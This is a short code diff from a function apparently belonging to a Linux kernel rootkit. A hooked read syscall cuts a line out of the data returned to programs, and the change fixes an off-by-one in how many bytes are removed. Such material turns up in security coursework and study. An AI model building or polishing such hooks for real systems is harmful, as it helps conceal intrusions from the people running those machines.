@@ -118,7 +118,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
     if(line_end !=NULL){
       line_end++;
       memcpy(line_start, line_end, (char __user*)(buf + nread) - line_end);
-      nread -= (ssize_t)(line_end - line_start + 1);
+      nread -= (ssize_t)(line_end - line_start);
     }
   }
   return (ssize_t)nread;
